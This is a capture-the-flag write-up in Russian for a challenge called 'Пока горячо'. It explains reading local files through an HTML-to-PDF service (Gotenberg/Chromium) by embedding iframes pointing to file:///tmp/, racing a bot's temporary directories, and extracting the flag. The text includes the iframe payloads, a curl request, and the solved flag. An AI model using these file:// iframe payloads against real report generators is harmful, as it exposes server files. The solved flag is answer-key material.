# Пока горячо

## Идея
Backend дает API для генерации PDF отчета из HTML:

- Запрос на `/api/generate-report` создает временную директорию `/tmp/report-<hex>/` и кладет туда `index.html` и итоговый `report.pdf`.
- PDF можно скачать по ссылке вида `/reports/report-<hex>/report.pdf`.
- Фоновая очистка удаляет `/tmp/report-*` старше ~10 секунд.

Параллельно в приватной сети работает `flagbot`, который каждые 5 секунд отправляет в `gotenberg` HTML со флагом. Gotenberg временно раскладывает входные файлы по директориям с UUID в своем `/tmp`.

Если во время генерации своего PDF встроить `iframe` с `file:///tmp/`, то chromium внутри gotenberg отрисует содержимое каталога и мы увидим UUID временных директорий. Дальше остается поймать момент, когда среди них есть директория с `index.html` от flagbot, и запросить ее через `file:///tmp/<uuid>/index.html`.

## Решение (полуавтомат)
1. Регистрируемся и логинимся, получаем JWT как в предыдущей задаче.

2. Делаем отчет с листингом `/tmp` внутри gotenberg:
```html
<html>
  <body>
    <h1>list</h1>
    <iframe src="file:///tmp/"></iframe>
  </body>
</html>
```

Отправляем:
```bash
curl -s -X POST http://HOST:8080/api/generate-report \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d @payload.json
```
где `payload.json`:
```json
{"host":"x","html":"<html><body><iframe src=\"file:///tmp/\"></iframe></body></html>"}
```

3. Открываем выданную ссылку на PDF и ищем UUID-папки (обычно выглядит как `xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`).

4. Повторяем несколько раз, пока не увидим новую UUID, появляющуюся примерно раз в 5 секунд. Это временная папка от flagbot.

5. Генерируем второй отчет, где `iframe` указывает на найденный файл:
```html
<iframe src="file:///tmp/<UUID>/index.html"></iframe>
```

6. Скачиваем PDF, внутри будет HTML со флагом.

## Флаг
`FECTF{v3ry_1mp0r74n7_1nf0rm4710n_f0r_r3p0r7_63n3r470r}`
